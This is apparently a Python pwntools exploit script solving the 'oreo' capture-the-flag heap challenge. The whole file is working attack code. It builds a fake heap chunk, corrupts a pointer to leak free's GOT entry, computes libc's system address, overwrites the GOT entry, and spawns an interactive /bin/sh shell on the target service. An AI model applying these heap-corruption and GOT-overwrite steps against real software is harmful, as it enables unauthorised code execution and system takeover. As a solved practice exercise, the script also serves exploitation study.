from pwn import *

DEBUG = True

heap_size = 0x40
size = 0x38

num_selected_rifle_addr = 0x804a2a4
free_got = 0x804a238
msg_buffer = 0x804a2c0

free_offset = 0x76de0
system_offset = 0x40310

def r(p, msg):
  response = p.recvuntil(msg)
  if DEBUG:
    log.info(response)
  return response

def add_rifle(p, name, description):
  # Select add rifle
  r(p, "Action: ")
  p.sendline("1")

  r(p, "name: ")
  p.sendline(name)

  r(p, "description: ")
  p.sendline(description)

def order_rifle(p):
  # Select order rifle
  r(p, "Action: ")
  p.sendline("3")

def leave_msg(p, msg):
  # Select leave message
  r(p, "Action: ")
  p.sendline("4")

  r(p, "order: ")
  p.sendline(msg)
 
def show_stats(p):
  # Select show stats
  r(p, "Action: ")
  p.sendline("5")

#p = process("./oreo")
p = remote("localhost", 9559)
#p = remote("localhost", 4925)

for i in range(heap_size):
  add_rifle(p, "NAME%d" % i, "DESCRIPTION%d" % i)

name = "A" * (size - 0x4 - 0x19)    # Fill heap buffer
name += p32(num_selected_rifle_addr + 0x4)  # next pointer

add_rifle(p, name, "DESCRIPTION")

payload = "AAAA" * 7
payload += p32(0x0)      # next ptr
payload += p32(0x0)      # prev_size
payload += p32(0x40)     # size + in_use bit

leave_msg(p, payload)

order_rifle(p)

order_msg_overwrite = p32(free_got)
add_rifle(p, "NAME", order_msg_overwrite)

show_stats(p)
response = r(p, "======================")

response = response.split("Order Message: ")[1]
response = response.split("\n==")[0]

#log.info(response.encode("hex"))

free_addr = u32(response[:4])
system_addr = free_addr - free_offset + system_offset

payload = p32(system_addr)
payload += response[4:]

leave_msg(p, payload)

add_rifle(p, "NAME", "/bin/sh")
#add_rifle(p, "NAME", "/bin/cat flag")

order_rifle(p)

p.interactive()

p.close()
